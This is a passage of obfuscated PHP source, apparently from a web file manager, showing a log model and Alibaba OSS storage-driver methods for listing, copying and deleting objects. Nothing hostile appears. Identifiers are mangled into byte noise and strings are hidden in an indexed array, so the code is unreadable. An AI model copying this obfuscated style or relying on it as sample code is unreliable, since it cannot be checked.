array_flip($éÆ‡Ë¾ª[486], $éÆ‡Ë¾ª[32])); $Œ¸˜”¡[$éÆ‡Ë¾ª[2447]] = $£ÕŒˆÈ; } else { $Œ¸˜”¡ = array($éÆ‡Ë¾ª[2447] => $£ÕŒˆÈ); } } else { if (is_array($Œ¸˜”¡)) { $Œ¸˜”¡[$éÆ‡Ë¾ª[2447]] = $£ÕŒˆÈ; } else { $Œ¸˜”¡ = array($éÆ‡Ë¾ª[1285] => $Œ¸˜”¡, $éÆ‡Ë¾ª[2447] => $£ÕŒˆÈ); } } $Œ¸˜”¡[$éÆ‡Ë¾ª[2448]] = ACTION; $Œ¸˜”¡ = array($éÆ‡Ë¾ª[1767] => Session::sign(), $éÆ‡Ë¾ª[1768] => intval($»¸ÔŠéÏ), $éÆ‡Ë¾ª[33] => $¥¯Ó§¼Ø, $éÆ‡Ë¾ª[1770] => json_encode($Œ¸˜”¡)); return parent::add($Œ¸˜”¡); } public function remove($˜äøì÷³) { $this->where(array($_SERVER[äô®•½Â][504] => $˜äøì÷³))->delete(); } private function _makeOrder($£§ïúá = '') { $Š§ çÕÇ =& $_SERVER[äô®•½Â]; $¨ª‹««û = $Š§ çÕÇ[234]; $ğİŒÆ‹Ë = array($Š§ çÕÇ[534] => $Š§ çÕÇ[535], $Š§ çÕÇ[536] => $Š§ çÕÇ[537]); $¤›œ¼Êø = Input::get($Š§ çÕÇ[542], $Š§ çÕÇ[7], $Š§ çÕÇ[2161], array($Š§ çÕÇ[2073], $Š§ çÕÇ[536])); $¤›œ¼Êø = $ğİŒÆ‹Ë[$¤›œ¼Êø]; $£§ïúá = $£§ïúá . "{$¨ª‹««û}\40{$¤›œ¼Êø}"; return $this->order($£§ïúá); } public function get($œÌØ×©é = '') { $ñªŒ«ëÕ =& $_SERVER[äô®•½Â]; if (!$œÌØ×©é) { show_json(array()); } $”áö»ÚÒ = array(); if ($œÌØ×©é[$ñªŒ«ëÕ[1777]]) { $”áö»ÚÒ[$ñªŒ«ëÕ[1777]] = $œÌØ×©é[$ñªŒ«ëÕ[1777]]; } if (isset($œÌØ×©é[$ñªŒ«ëÕ[826]])) { $ôÓÔÒùú = $œÌØ×©é[$ñªŒ«ëÕ[826]]; $Ò™ïö¯ = isset($œÌØ×©é[$ñªŒ«ëÕ[827]]) ? $œÌØ×©é[$ñªŒ«ëÕ[827]] : time(); $”áö»ÚÒ[$ñªŒ«ëÕ[234]] = array($ñªŒ«ëÕ[419], array($ôÓÔÒùú, $Ò™ïö¯)); } if ($œÌØ×©é[$ñªŒ«ëÕ[33]]) { $Ã½ĞÓéÅ = explode($ñªŒ«ëÕ[50], $œÌØ×©é[$ñªŒ«ëÕ[33]]); $£«ú”ıé = $this->typeFile(); $©üªß = array(); foreach ($Ã½ĞÓéÅ as $¸½¼†™º) { $©üªß[] = $¸½¼†™º; if (isset($£«ú”ıé[$¸½¼†™º])) { $©üªß = array_merge($©üªß, $£«ú”ıé[$¸½¼†™º]); } } $©üªß = array_unique($©üªß); if ($©üªß) { $”áö»ÚÒ[$ñªŒ«ëÕ[33]] = array($ñªŒ«ëÕ[7], $©üªß); } } else { $”áö»ÚÒ[$ñªŒ«ëÕ[33]] = array($ñªŒ«ëÕ[2449], $ñªŒ«ëÕ[2450]); } if (!empty($œÌØ×©é[$ñªŒ«ëÕ[2447]])) { $”áö»ÚÒ[$ñªŒ«ëÕ[537]] = array($ñªŒ«ëÕ[470], "\x25{$œÌØ×©é[$ñªŒ«ëÕ[2447]]}\x25"); } $Ù“‹ÎšÈ = $this->_makeOrder()->where($”áö»ÚÒ)->selectPage(); if (empty($Ù“‹ÎšÈ[$ñªŒ«ëÕ[456]])) { show_json(array(), !0, $Ù“‹ÎšÈ[$ñªŒ«ëÕ[453]]); } $Ù“‹ÎšÈ[$ñªŒ«ëÕ[456]] = $this->logList($Ù“‹ÎšÈ[$ñªŒ«ëÕ[456]]); return $Ù“‹ÎšÈ; } private function ipAddress(&$‚¶ «¦ë) { $ÈÁÉˆÇ² =& $_SERVER[äô®•½Â]; if (!empty($‚¶ «¦ë[$ÈÁÉˆÇ²[2447]])) { $ˆæ™è·À = IpLocation::get($‚¶ «¦ë[$ÈÁÉˆÇ²[2447]]); } else { $ˆæ™è·À = LNG($ÈÁÉˆÇ²[2451]); } $‚¶ «¦ë[$ÈÁÉˆÇ²[2452]] = $ˆæ™è·À; } private function descZipDownload($òÓ„Ò€”, &$˜ãõï¤…) { $Ÿ ¢ı› =& $_SERVER[äô®•½Â]; if (!isset($òÓ„Ò€”[$Ÿ ¢ı›[2453]])) { return; } $„ôÏ·±  = json_decode($òÓ„Ò€”[$Ÿ ¢ı›[2453]], !0); foreach ($„ôÏ·±  as $õêƒÄ¨Ã) { try { $‹ÓêæşÆ = IO::infoFullSimple($õêƒÄ¨Ã[$Ÿ ¢ı›[87]]); } catch (Exception $ªöœáä´) { continue; } $òÓ„Ò€”[$Ÿ ¢ı›[87]] = $õêƒÄ¨Ã[$Ÿ ¢ı›[87]]; $˜ãõï¤…[] = $òÓ„Ò€”[$Ÿ ¢ı›[194]] = $‹ÓêæşÆ[$Ÿ ¢ı›[194]]; $˜ãõï¤…[] = $òÓ„Ò€”[$Ÿ ¢ı›[2215]] = $‹ÓêæşÆ[$Ÿ ¢ı›[193]]; break; } return $òÓ„Ò€”; } private function getSourceList(&$ÅŠŠÀ–) { $ ªÒş¾ğ =& $_SERVER[äô®•½Â]; $úÖöÙ±« = array(); foreach ($ÅŠŠÀ– as $áªìàê => $®öğ¨²ø) { $üÙ¬è = json_decode($®öğ¨²ø[$ ªÒş¾ğ[537]], !0); if ($®öğ¨²ø[$ ªÒş¾ğ[33]] == $ ªÒş¾ğ[1951]) { $üÙ¬è = $this->descZipDownload($üÙ¬è, $úÖöÙ±«); $ÅŠŠÀ–[$áªìàê][$ ªÒş¾ğ[537]] = json_encode($üÙ¬è); continue; } if (strpos($®öğ¨²ø[$ ªÒş¾ğ[33]], $ ªÒş¾ğ[2217]) !== 0) { if (!isset($üÙ¬è[$ ªÒş¾ğ[87]]) || strpos($®öğ¨²ø[$ ªÒş¾ğ[33]], $ ªÒş¾ğ[2454]) !== 0) { continue; } try { $úòÒ´°ƒ = IO::infoFullSimple($üÙ¬è[$ ªÒş¾ğ[87]]); } catch (Exception $†»ˆ¬±œ) { continue; } $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[194]] = $úòÒ´°ƒ[$ ªÒş¾ğ[194]]; $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[2215]] = $úòÒ´°ƒ[$ ªÒş¾ğ[193]]; $ÅŠŠÀ–[$áªìàê][$ ªÒş¾ğ[537]] = json_encode($üÙ¬è); continue; } $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[194]]; $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[2215]]; if ($üÙ¬è[$ ªÒş¾ğ[33]] == $ ªÒş¾ğ[636]) { $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[537]][$ ªÒş¾ğ[1237]]; $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[537]][$ ªÒş¾ğ[1238]]; } if ($üÙ¬è[$ ªÒş¾ğ[33]] == $ ªÒş¾ğ[2226]) { $úÖöÙ±«[] = $üÙ¬è[$ ªÒş¾ğ[537]][$ ªÒş¾ğ[194]]; } } if (!$úÖöÙ±«) { return array(); } return Model($ ªÒş¾ğ[896])->sourceListInfo($úÖöÙ±«, !0); } private function logList($‰ØÍÈàé) { $êŞŠ¨ƒ =& $_SERVER[äô®•½Â]; $øÆœĞ±Ç = array_to_keyvalue($‰ØÍÈàé, $êŞŠ¨ƒ[12], $êŞŠ¨ƒ[1777]); $ñ˜œ­êµ = Model($êŞŠ¨ƒ[610])->userListInfo(array_unique($øÆœĞ±Ç)); $ÀÕœ·²ã = $this->getSourceList($‰ØÍÈàé); $ÌäĞÃàŒ = $this->typeAll(); $Æ«‘…æÄ = array(); $£û¯°öÌ = array(); foreach ($‰ØÍÈàé as $Ö´À‚†® => $ğ¥Å¾Ìâ) { $ùÁ¹òÊÙ = $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[33]]; $è¥œõœœ = isset($ñ˜œ­êµ[$ğ¥Å¾Ìâ[$êŞŠ¨ƒ[1777]]]) ? $ñ˜œ­êµ[$ğ¥Å¾Ìâ[$êŞŠ¨ƒ[1777]]] : !1; $êœ­´Ñ = strpos($ùÁ¹òÊÙ, $êŞŠ¨ƒ[2455]) === 0 ? LNG($êŞŠ¨ƒ[2456]) : LNG($êŞŠ¨ƒ[2451]); $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[32]] = isset($è¥œõœœ[$êŞŠ¨ƒ[32]]) ? $è¥œõœœ[$êŞŠ¨ƒ[32]] : LNG($êŞŠ¨ƒ[2451]); $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2277]] = isset($è¥œõœœ[$êŞŠ¨ƒ[2277]]) ? $è¥œõœœ[$êŞŠ¨ƒ[2277]] : $êŞŠ¨ƒ[12]; $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[1664]] = isset($ÌäĞÃàŒ[$ùÁ¹òÊÙ]) ? $ÌäĞÃàŒ[$ùÁ¹òÊÙ] : $êœ­´Ñ; $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2160]] = $è¥œõœœ; $Ë˜‘Ï½ = json_decode($ğ¥Å¾Ìâ[$êŞŠ¨ƒ[537]], !0); $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2447]] = isset($Ë˜‘Ï½[$êŞŠ¨ƒ[2447]]) ? $Ë˜‘Ï½[$êŞŠ¨ƒ[2447]] : $êŞŠ¨ƒ[12]; $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2452]] = IpLocation::get($ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2447]]); if (strpos($ùÁ¹òÊÙ, $êŞŠ¨ƒ[2217]) === 0 || isset($Ë˜‘Ï½[$êŞŠ¨ƒ[2215]])) { $Ë˜‘Ï½[$êŞŠ¨ƒ[90]] = $ÀÕœ·²ã[$Ë˜‘Ï½[$êŞŠ¨ƒ[194]]]; $Ë˜‘Ï½[$êŞŠ¨ƒ[2231]] = $ÀÕœ·²ã[$Ë˜‘Ï½[$êŞŠ¨ƒ[2215]]]; if ($Ë˜‘Ï½[$êŞŠ¨ƒ[33]] == $êŞŠ¨ƒ[636]) { $Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[1237]] = $ÀÕœ·²ã[$Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[1237]]]; $Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[1238]] = $ÀÕœ·²ã[$Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[1238]]]; } if ($Ë˜‘Ï½[$êŞŠ¨ƒ[33]] == $êŞŠ¨ƒ[2226]) { $Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[194]] = $ÀÕœ·²ã[$Ë˜‘Ï½[$êŞŠ¨ƒ[537]][$êŞŠ¨ƒ[194]]]; } if ($Ë˜‘Ï½[$êŞŠ¨ƒ[33]] == $êŞŠ¨ƒ[1225]) { $Ë˜‘Ï½[$êŞŠ¨ƒ[2231]] = $Ë˜‘Ï½[$êŞŠ¨ƒ[90]]; $Ë˜‘Ï½[$êŞŠ¨ƒ[2215]] = $Ë˜‘Ï½[$êŞŠ¨ƒ[2231]][$êŞŠ¨ƒ[194]]; $Ë˜‘Ï½[$êŞŠ¨ƒ[90]] = !1; $Ë˜‘Ï½[$êŞŠ¨ƒ[194]] = $êŞŠ¨ƒ[12]; } $–Ø·çæ© = array($êŞŠ¨ƒ[1225], $êŞŠ¨ƒ[2213]); if (!in_array($Ë˜‘Ï½[$êŞŠ¨ƒ[33]], $–Ø·çæ©)) { if ($Ë˜‘Ï½[$êŞŠ¨ƒ[90]] && $Ë˜‘Ï½[$êŞŠ¨ƒ[90]][$êŞŠ¨ƒ[191]] == $êŞŠ¨ƒ[192]) { $£û¯°öÌ[] = $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[486]]; unset($‰ØÍÈàé[$Ö´À‚†®]); continue; } if ($Ë˜‘Ï½[$êŞŠ¨ƒ[2231]] && $Ë˜‘Ï½[$êŞŠ¨ƒ[2231]][$êŞŠ¨ƒ[191]] == $êŞŠ¨ƒ[192]) { $£û¯°öÌ[] = $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[486]]; unset($‰ØÍÈàé[$Ö´À‚†®]); continue; } } } $ğ¥Å¾Ìâ[$êŞŠ¨ƒ[537]] = $Ë˜‘Ï½; unset($ğ¥Å¾Ìâ[$êŞŠ¨ƒ[2457]]); $Æ«‘…æÄ[] = $ğ¥Å¾Ìâ; } $this->clearSystemPathLog($£û¯°öÌ); return $Æ«‘…æÄ; } private function clearSystemPathLog($ãÌ³¯êÔ) { $›šË‹ =& $_SERVER[äô®•½Â]; if (count($ãÌ³¯êÔ) == 0) { return; } $ıìı©‘ = array($›šË‹[486] => array($›šË‹[7], array_unique($ãÌ³¯êÔ))); $this->where($ıìı©‘)->delete(); } public function deviceList($µ­¦ÃÑË, $†‡šå˜‡ = 0) { $Ê²ê°§Ã =& $_SERVER[äô®•½Â]; $¦š¥¾æì = array($Ê²ê°§Ã[1777] => $µ­¦ÃÑË, $Ê²ê°§Ã[234] => array($Ê²ê°§Ã[1086], $†‡šå˜‡), $Ê²ê°§Ã[33] => $Ê²ê°§Ã[1921]); $ ÊæúƒÒ = array(); $·ç‚ë€Ã = $this->field($Ê²ê°§Ã[2458])->where($¦š¥¾æì)->order($Ê²ê°§Ã[2229])->limit(50)->select(); foreach ($·ç‚ë€Ã as $Å¼œÇµĞ => $¿Ü’®ä) { if ($Å¼œÇµĞ > 0 && abs($¿Ü’®ä[$Ê²ê°§Ã[234]] - $·ç‚ë€Ã[$Å¼œÇµĞ - 1][$Ê²ê°§Ã[234]]) < 5) { continue; } $Ì©áŒÂâ = json_decode($¿Ü’®ä[$Ê²ê°§Ã[537]], !0); $¿Ü’®ä[$Ê²ê°§Ã[2447]] = isset($Ì©áŒÂâ[$Ê²ê°§Ã[2447]]) ? $Ì©áŒÂâ[$Ê²ê°§Ã[2447]] : $Ê²ê°§Ã[12]; unset($Ì©áŒÂâ[$Ê²ê°§Ã[2447]]); $²³óûÆ = $this->deviceType($Ì©áŒÂâ[$Ê²ê°§Ã[2218]]); if (isset($ ÊæúƒÒ[$²³óûÆ])) { continue; } $¿Ü’®ä[$Ê²ê°§Ã[2452]] = IpLocation::get($¿Ü’®ä[$Ê²ê°§Ã[2447]]); $¿Ü’®ä[$Ê²ê°§Ã[537]] = $Ì©áŒÂâ; $ ÊæúƒÒ[$²³óûÆ] = $¿Ü’®ä; } return array_values($ ÊæúƒÒ); } public function deviceType($Ä«ëï–) { return $Ä«ëï–; } } goto D¸‹…¨•§…; B¾çÍÉ¿çØ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÀàµŒË) { parent::__construct($ÀàµŒË); $this->setSignVersion($_SERVER[äô®•½Â][250]); } public function uploadFormData($‹Ë£Õ “, $ìôÊ¸ğ = 3600) { return $this->uploadFormDataV2($‹Ë£Õ “, $ìôÊ¸ğ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($öëà×¹¤) { parent::__construct(); include_once SDK_DIR . $_SERVER[äô®•½Â][1468]; $this->_init($öëà×¹¤); } public function _init($¦ãâ„ğ) { $õ«Èƒ€ =& $_SERVER[äô®•½Â]; $this->config = $¦ãâ„ğ; foreach ($¦ãâ„ğ as $Ÿ˜»ø => $ÓŠÖµãİ) { if (isset($this->{$Ÿ˜»ø})) { $this->{$Ÿ˜»ø} = $ÓŠÖµãİ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($õ«Èƒ€[1469] . LNG($õ«Èƒ€[1470])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $»‰ğÚîÔ =& $_SERVER[äô®•½Â]; $ª°¾’” = new OSS\Model\CorsConfig(); $Äò…™†Ü = new OSS\Model\CorsRule(); $Äò…™†Ü->addAllowedOrigin($»‰ğÚîÔ[1471]); $Äò…™†Ü->addAllowedMethod($»‰ğÚîÔ[1472]); $Äò…™†Ü->addAllowedMethod($»‰ğÚîÔ[1473]); $Äò…™†Ü->addAllowedMethod($»‰ğÚîÔ[1474]); $Äò…™†Ü->addAllowedMethod($»‰ğÚîÔ[1475]); $Äò…™†Ü->addAllowedMethod($»‰ğÚîÔ[165]); $Äò…™†Ü->setMaxAgeSeconds(600); $Äò…™†Ü->addExposeHeader($»‰ğÚîÔ[1476]); $Äò…™†Ü->addAllowedHeader($»‰ğÚîÔ[1471]); $ª°¾’”->addRule($Äò…™†Ü); try { $this->client->putBucketCors($this->bucket, $ª°¾’”); } catch (OSS\Core\OssException $™ñÙĞ) { $this->writeLog(__FUNCTION__ . $»‰ğÚîÔ[215] . $™ñÙĞ->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÎöìÍ’ç =& $_SERVER[äô®•½Â]; $µ´²ğ¨ã = null; try { $µ´²ğ¨ã = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Å´Ë™‚) { $this->writeLog(__FUNCTION__ . $ÎöìÍ’ç[215] . $Å´Ë™‚->getMessage()); return null; } if (!$µ´²ğ¨ã || !($ßÍ¹éÇÌ = $µ´²ğ¨ã->getRules())) { return null; } $ÛèéÅ° = $ßÍ¹éÇÌ[0]->getAllowedOrigins(); $«™Ø ÈÔ = $ßÍ¹éÇÌ[0]->getAllowedMethods(); $óß²Ì£á = $ßÍ¹éÇÌ[0]->getMaxAgeSeconds(); $ğÜ¯¥È = $ßÍ¹éÇÌ[0]->getExposeHeaders(); $ ø³­şª = $ßÍ¹éÇÌ[0]->getAllowedHeaders(); return array($ÎöìÍ’ç[221] => isset($ÛèéÅ°[0]) ? $ÛèéÅ°[0] : $ÎöìÍ’ç[12], $ÎöìÍ’ç[225] => $«™Ø ÈÔ, $ÎöìÍ’ç[1477] => $óß²Ì£á, $ÎöìÍ’ç[1478] => isset($ğÜ¯¥È[0]) ? $ğÜ¯¥È[0] : $ÎöìÍ’ç[12], $ÎöìÍ’ç[222] => isset($ ø³­şª[0]) ? $ ø³­şª[0] : $ÎöìÍ’ç[12]); } public function isBucketCors() { $µ‚¾¢Ö =& $_SERVER[äô®•½Â]; $„ú«ç¤ = $this->getBucketCors(); if (!$„ú«ç¤ || !is_array($„ú«ç¤)) { return !1; } if ($„ú«ç¤[$µ‚¾¢Ö[221]] != $µ‚¾¢Ö[223] || $„ú«ç¤[$µ‚¾¢Ö[222]] != $µ‚¾¢Ö[223]) { return !1; } $ÄÌ³ôƒ = array_map($µ‚¾¢Ö[224], $„ú«ç¤[$µ‚¾¢Ö[225]]); if (!is_array($ÄÌ³ôƒ)) { $ÄÌ³ôƒ = array(); } $¤şÂ“ã¢ = array($µ‚¾¢Ö[226], $µ‚¾¢Ö[227], $µ‚¾¢Ö[228], $µ‚¾¢Ö[229], $µ‚¾¢Ö[230]); $…æÈË™½ = array_diff($¤şÂ“ã¢, $ÄÌ³ôƒ); return empty($…æÈË™½); } public function mkfile($Æ˜Õ„Ê£, $¨»¾Ô÷¾ = '', $Ì„ÀÚ× = REPEAT_RENAME) { $İ§ä³âÉ = $this->setContent($Æ˜Õ„Ê£, $¨»¾Ô÷¾); if ($İ§ä³âÉ !== !1) { return $this->getPathOuter($Æ˜Õ„Ê£); } return !1; } public function mkdir($í­üçéò, $–¶ ¸À÷ = REPEAT_SKIP) { if ($–¶ ¸À÷ && $this->_isFolder($í­üçéò)) { return $this->getPathOuter($í­üçéò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($í­üçéò)); } catch (OSS\Core\OssException $²Ë¥Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $²Ë¥Ö->getMessage()); return !1; } return $this->getPathOuter($í­üçéò); } private function fileList($ÇËµªÖ®, $¼¯ú³ÔØ = '', $Ùñìé¢í = 0) { $ªŒĞÚ ¯ =& $_SERVER[äô®•½Â]; $ÇËµªÖ® = trim($ÇËµªÖ®, $ªŒĞÚ ¯[8]); $òòôÛÖ = empty($ÇËµªÖ®) && $ÇËµªÖ® !== $ªŒĞÚ ¯[231] ? $ªŒĞÚ ¯[12] : $ÇËµªÖ® . $ªŒĞÚ ¯[8]; $æ“ÀÑğ… = $ªŒĞÚ ¯[12]; $õÃ¼Üä³ = 1000; $†ñÑµÌ³ = $œãû¢§ì = array(); while (!0) { check_abort(); $Ô±ÄşüÄ = array($ªŒĞÚ ¯[1479] => $¼¯ú³ÔØ, $ªŒĞÚ ¯[1480] => $òòôÛÖ, $ªŒĞÚ ¯[1481] => $õÃ¼Üä³, $ªŒĞÚ ¯[1482] => $æ“ÀÑğ…); try { $¶ş˜Ì”å = $this->client->listObjects($this->bucket, $Ô±ÄşüÄ); } catch (OSS\Core\OssException $õÈÍöÌ²) { $this->writeLog(__FUNCTION__ . $ªŒĞÚ ¯[215] . $õÈÍöÌ²->getMessage()); break; } $æ“ÀÑğ… = $¶ş˜Ì”å->getNextMarker(); $µ¼§¹©” = $¶ş˜Ì”å->getObjectList(); $–¸õ÷Åµ = $¶ş˜Ì”å->getPrefixList(); foreach ($µ¼§¹©” as $ÕÏ½Ù§œ) { if ($ÕÏ½Ù§œ->getKey() == $òòôÛÖ) { continue; } $’Ò­ãàÀ = $ÕÏ½Ù§œ->getKey(); $Ô­¢¤°Ö = $ÕÏ½Ù§œ->getSize(); $®¹—Àæ = $ÕÏ½Ù§œ->getLastModified(); $‹Â³§¢ = trim($ÕÏ½Ù§œ->getETag(), $ªŒĞÚ ¯[121]); $‚†²åôÃ = $Ùñìé¢í ? array($ªŒĞÚ ¯[32] => $’Ò­ãàÀ, $ªŒĞÚ ¯[79] => $Ô­¢¤°Ö, $ªŒĞÚ ¯[207] => strtotime($®¹—Àæ), $ªŒĞÚ ¯[1483] => $‹Â³§¢) : $’Ò­ãàÀ; $Óë‰±òÛ = $Ô­¢¤°Ö == 0 && substr($’Ò­ãàÀ, strlen($’Ò­ãàÀ) - 1, 1) == $ªŒĞÚ ¯[8] ? !0 : !1; $ÒĞ°Ê = array($ªŒĞÚ ¯[79] => $Ô­¢¤°Ö, $ªŒĞÚ ¯[1484] => $Ô­¢¤°Ö, $ªŒĞÚ ¯[88] => strtotime($®¹—Àæ), $ªŒĞÚ ¯[1485] => $®¹—Àæ, $ªŒĞÚ ¯[1483] => $‹Â³§¢); $this->cacheMethodInfoSet($’Ò­ãàÀ, $Óë‰±òÛ, $ÒĞ°Ê); if ($Óë‰±òÛ) { $†ñÑµÌ³[] = $’Ò­ãàÀ; continue; } $œãû¢§ì[] = $‚†²åôÃ; } foreach ($–¸õ÷Åµ as $¾¨²ÜÆ§) { $†ñÑµÌ³[] = $¾¨²ÜÆ§->getPrefix(); $this->cacheMethodInfoSet($¾¨²ÜÆ§->getPrefix(), !0); } if ($æ“ÀÑğ… === $ªŒĞÚ ¯[12]) { break; } } $this->cacheMethodInfoSet($ÇËµªÖ®, !0); return array($ªŒĞÚ ¯[85] => $†ñÑµÌ³, $ªŒĞÚ ¯[86] => $œãû¢§ì); } public function listObject($ˆúÉÚˆ, $Àß„’¥¼ = '') { $¿êæ½£ =& $_SERVER[äô®•½Â]; $ˆúÉÚˆ = trim($ˆúÉÚˆ, $¿êæ½£[8]); $È¿Ììˆ = empty($ˆúÉÚˆ) && $ˆúÉÚˆ !== $¿êæ½£[231] ? $¿êæ½£[12] : $ˆúÉÚˆ . $¿êæ½£[8]; $¯ÓòË ™ = $¿êæ½£[12]; $¥ì°¥™ = 1000; $¸Ì•à–Ç = $Ş”¥¸¶Æ = array(); while (!0) { check_abort(); $õ·õ¯³¬ = array($¿êæ½£[1479] => $Àß„’¥¼, $¿êæ½£[1480] => $È¿Ììˆ, $¿êæ½£[1481] => $¥ì°¥™, $¿êæ½£[1482] => $¯ÓòË ™); try { $’€‰í‡ã = $this->client->listObjects($this->bucket, $õ·õ¯³¬); } catch (OSS\Core\OssException $Õö¹”éŸ) { $this->writeLog(__FUNCTION__ . $¿êæ½£[215] . $Õö¹”éŸ->getMessage()); break; } $¯ÓòË ™ = $’€‰í‡ã->getNextMarker(); $Í”‡‡¶¶ = $’€‰í‡ã->getObjectList(); foreach ($Í”‡‡¶¶ as $¤‡õØÛ) { if ($¤‡õØÛ->getKey() == $È¿Ììˆ) { continue; } $Ï±Â©×À = $¤‡õØÛ->getKey(); $ª²¬—äé = $¤‡õØÛ->getSize(); $óå¤ŒüÁ = $ª²¬—äé == 0 && substr($Ï±Â©×À, strlen($Ï±Â©×À) - 1, 1) == $¿êæ½£[8] ? !0 : !1; if ($óå¤ŒüÁ) { continue; } $Ş”¥¸¶Æ[] = $ª²¬—äé . $¿êæ½£[215] . $Ï±Â©×À; } if ($¯ÓòË ™ === $¿êæ½£[12]) { break; } } return array($¿êæ½£[85] => $¸Ì•à–Ç, $¿êæ½£[86] => $Ş”¥¸¶Æ); } public function copyFile($â¡Ÿ©¼â, $Ø»…›××) { $æ³çùè™ = $this->size($â¡Ÿ©¼â); if ($æ³çùè™ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $â¡Ÿ©¼â, $this->bucket, $this->pathEncode($Ø»…›××)); } catch (OSS\Core\OssException $”àÍõÛÏ) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $”àÍõÛÏ->getMessage()); return !1; } return $this->getPathOuter($Ø»…›××); } $ Âã‹ÎÈ = $this->multiCopyObject($â¡Ÿ©¼â, $Ø»…›××, $æ³çùè™); return $ Âã‹ÎÈ ? $this->getPathOuter($Ø»…›××) : !1; } private function multiCopyObject($§ğ°¸ö», $ı‹Š¿å‘, $Ü­ÊöŞ€) { $¶“ª‚Ğ’ =& $_SERVER[äô®•½Â]; try { $…ö±Ïì¢ = array(); if ($í‚“Ä« = $this->hashMd5($§ğ°¸ö»)) { $…ö±Ïì¢ = array(OSS\OssClient::OSS_HEADERS => array($¶“ª‚Ğ’[1486] => $í‚“Ä«)); } $Á÷š¦Ø´ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ı‹Š¿å‘), $…ö±Ïì¢); $éÚ‚½˜ù = 1; $ı „¦ËÙ = 0; $ä·å¥äÔ = array(); $ÏÒ¡ÙÇä = 1024 * 1024 * 10; $Æ‹Ü¦»Ú = $this->client->generateMultiuploadParts($Ü­ÊöŞ€, $ÏÒ¡ÙÇä); foreach ($Æ‹Ü¦»Ú as $±’Âƒ¬± => $íøÊ‰³è) { $®è¦¬š = $ı „¦ËÙ + (int) $íøÊ‰³è[$¶“ª‚Ğ’[1487]]; $¼‚µáˆ£ = (int) $íøÊ‰³è[$¶“ª‚Ğ’[423]] + $®è¦¬š - 1; $ƒâ£ËÉ² = array($¶“ª‚Ğ’[167] => $®è¦¬š, $¶“ª‚Ğ’[168] => $¼‚µáˆ£); $ä·å¥äÔ[] = $this->client->uploadPartCopy($this->bucket, $§ğ°¸ö», $this->bucket, $this->pathEncode($ı‹Š¿å‘), $éÚ‚½˜ù, $Á÷š¦Ø´, $ƒâ£ËÉ²); $éÚ‚½˜ù = $éÚ‚½˜ù + 1; } $òÜİ¾Éü = array(); foreach ($ä·å¥äÔ as $±’Âƒ¬± => $ñÀ¼çš«) { $òÜİ¾Éü[] = array($¶“ª‚Ğ’[300] => $±’Âƒ¬± + 1, $¶“ª‚Ğ’[301] => $ñÀ¼çš«); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ı‹Š¿å‘), $Á÷š¦Ø´, $òÜİ¾Éü); } catch (OSS\Core\OssException $–½õ»Á) { $this->writeLog(__FUNCTION__ . $¶“ª‚Ğ’[215] . $–½õ»Á->getMessage()); return !1; } return !0; } public function moveFile($àğ¿òï, $Å‰Éµ§ø) { if ($this->copyFile($àğ¿òï, $Å‰Éµ§ø)) { $this->remove($àğ¿òï); return $this->getPathOuter($Å‰Éµ§ø); } return !1; } public function delFile($ªş©§¯) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ªş©§¯)); } catch (OSS\Core\OssException $¨Ìæç¸) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][215] . $¨Ìæç¸->getMessage()); return !1; } return !0; } public function delFolder($îä¦îŠü) { $ğÏÙ¤úÙ =& $_SERVER[äô®•½Â]; if (!$this->exist($îä¦îŠü)) { return !0; } $this->listItemCache = !1; $çºª‡Á = $this->fileList($îä¦îŠü); $this->listItemCache = !0; $¬…ÖÅõË = trim($îä¦îŠü, $ğÏÙ¤úÙ[8]) . $ğÏÙ¤úÙ[8]; if (!empty($îä¦îŠü) && $îä¦îŠü !== $ğÏÙ¤úÙ[231] && !in_array($¬…ÖÅõË, $çºª‡Á[$ğÏÙ¤úÙ[85]])) { $çºª‡Á[$ğÏÙ¤úÙ[85]][] = $¬…ÖÅõË; } $ãºß¬¼ = $this->delByBatch($çºª‡Á[$ğÏÙ¤úÙ[86]]); if (!$ãºß¬¼) { return !1; } $ãºß¬¼ = $this->delByBatch($çºª‡Á[$ğÏÙ¤úÙ[85]]); if (!$ãºß¬¼) { return !1; } return $this->delFile($¬…ÖÅõË); } private function delByBatch($¼ÌÇÄ¨) { 